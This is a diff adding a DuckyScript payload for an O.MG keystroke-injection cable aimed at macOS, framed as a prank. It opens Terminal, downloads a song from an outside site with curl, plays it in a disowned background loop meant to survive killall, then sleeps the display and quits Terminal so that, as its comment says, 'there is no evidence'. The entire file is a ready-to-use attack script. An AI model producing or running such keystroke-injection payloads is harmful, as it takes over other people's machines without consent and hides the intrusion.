@@ -1,0 +1,31 @@
+REM # O.MG duckyscript for MacOS to severly RickRoll someone.
+REM # The script will download the song, play the song and lock the screen. The song plays in the background in a loop, so the user will reboot before they will able to stop the loop.
+REM # killall will not work, to stop this try to find the loop process.
+REM # The terminal is closed before the screen goes to sleep, so there is no evidence ;)
+
+
+GUI SPACE
+STRING Terminal
+ENTER
+DELAY 50
+
+REM ## Raise volume to 100% even if muted
+REM # STRING osascript -e "set volume output volume 100"
+ENTER
+DELAY 10
+
+REM ## Download and play the song 99999 times in the background (set to as many times as you want)
+STRING curl -s https://legitmuzic.com/wp-content/uploads/2021/09/Rick_Astley_-_Never_Gonna_Give_You_Up_legitmuzic.com.mp3 --output /tmp/wtf.mp3 >> /dev/null && for i in `seq 99999` ; do afplay /tmp/wtf.mp3 ; done & disown
+ENTER
+
+REM ## Lock the screen
+GUI SPACE
+STRING Terminal
+ENTER
+DELAY 50
+STRING pmset displaysleepnow 
+ENTER
+GUI q
+ENTER
+DELAY 50
+ENTER
